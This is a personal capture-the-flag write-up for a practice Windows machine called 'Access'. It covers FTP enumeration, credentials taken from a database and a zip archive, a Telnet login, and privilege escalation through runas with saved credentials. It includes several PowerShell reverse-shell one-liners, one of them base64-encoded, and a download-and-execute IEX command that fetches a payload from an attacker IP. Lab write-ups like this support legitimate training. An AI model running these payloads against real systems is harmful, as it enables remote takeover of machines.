+++
title = 'Access'
description = 'Easy Windows'
writeup = true
hideMeta = true
+++

nmap scan
`nmap  -p- -vv -T4 -Pn --min-rate=1000 -sC`
![Access (Easy Windows).png](Access%20%28Easy%20Windows%29.png)
website is just a static page
![Access (Easy Windows)-1.png](Access%20%28Easy%20Windows%29-1.png)
searching LON-MC6 does immediately should MS09-042 which seems like a vulnerability in Telnet that could allow RCE
And port 23 is open with telnet
`telnet 10.129.241.188`
results in a "Welcome to Microsoft Telnet Service" message and login is required

lets look at port 21 with ftp open
anonymous login is valid

there's a couple files on the ftp server but downloading them, one is a backup.mdb which is a MS Access Database but it seems to not be downloading properly. The other is Access Control.zip which is encrypted

so lets try to do the telnet vulnerability

Okay so I peeked at the walkthrough and downloading the files on ftp was correct - I had to change to binary mode to download them properly

![Access (Easy Windows)-2.png](Access%20%28Easy%20Windows%29-2.png)
Create csvs of every table:
![Access (Easy Windows)-3.png](Access%20%28Easy%20Windows%29-3.png)
auth_group
![Access (Easy Windows)-4.png](Access%20%28Easy%20Windows%29-4.png)
so we can see that `administrator` is a Administrator level account
looking at auth_user
![Access (Easy Windows)-5.png](Access%20%28Easy%20Windows%29-5.png)
`admin` : `admin`
`engineer` : `access4u@security`
`backup_admin` : `admin`
![Access (Easy Windows)-6.png](Access%20%28Easy%20Windows%29-6.png)
credentials did not work with telnet - so maybe it will work for ftp or decrypt zip file
the engineer password worked for the zip file
`7z x Access\ Control.zip`
Got a Access Control.pst file which is a Microsoft Outlook Personal Storage file
`sudo apt install pst-utils` to be able to read in linux

Reading the email
![Access (Easy Windows)-7.png](Access%20%28Easy%20Windows%29-7.png)
`security` : `4Cc3ssC0ntr0ller`

try use on telnet
![Access (Easy Windows)-8.png](Access%20%28Easy%20Windows%29-8.png)

user.txt = ab2ab8f61dd197103a7a84665b4b04ff

Don't know what im doing with priv esc so pausing here and going to watch/read some priv esc stuff

![Access (Easy Windows)-9.png](Access%20%28Easy%20Windows%29-9.png)

Running `cmdkey /list`
![Access (Easy Windows)-10.png](Access%20%28Easy%20Windows%29-10.png)
More on info on the hacktricks windows priv esc page
Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

```powershell
powershell -NoProfile -NonInteractive -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()"
```

Powershell

![Access (Easy Windows)-11.png](Access%20%28Easy%20Windows%29-11.png)

runas opens a new window so can't really be used to just run cmd.exe for us
```powershell
# Enumerate through all *.lnk files (which are shortcut files) on the system and examine them for the runas command
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
# shortcuts.txt has paths to all .lnk files, now we look for runas in the file
ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
```

![Access (Easy Windows)-12.png](Access%20%28Easy%20Windows%29-12.png)

It can be seen that ZKTeco\ZKAccess3.5\Access.exe is being run with the saved creds using runas

```powershell
runas /savecred /user:ACCESS\Administrator "powershell -NoProfile -NonInteractive -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()""


runas /user:ACCESS\Administrator /savecred "powershell -NoProfile -NonInteractive -EncodedCommand IiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2LjE5NicsMTIzNCk7ICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07IHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgeyAkZGF0YSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwkaSk7ICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcpOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyAkc3RyZWFtLkZsdXNoKCkgfTsgJGNsaWVudC5DbG9zZSgpIgo="

powershell -NoProfile -NonInteractive -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()"

runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:8080/admin.ps1')"
```

This shit aint working, im going through the walkthrough

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

![Access (Easy Windows)-15.png](Access%20%28Easy%20Windows%29-15.png)
put the payload into a file 'admin.ps1' and serve it

![Access (Easy Windows)-13.png](Access%20%28Easy%20Windows%29-13.png)
Use
```powershell
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.196/admin.ps1')"
```
- `runas /user:ACCESS\Administrator /savecred`: Runs a command as another user (in this case, `Administrator`) using saved credentials. If the credentials were previously entered and saved, it won’t prompt again.
- `powershell -c IEX (...)`: Executes a PowerShell command that downloads and runs a remote script (`admin.ps1`) from your attacking machine.
- `IEX` **(Invoke-Expression)**: Executes the string returned by `DownloadString`, which is your reverse shell payload.


![Access (Easy Windows)-14.png](Access%20%28Easy%20Windows%29-14.png)
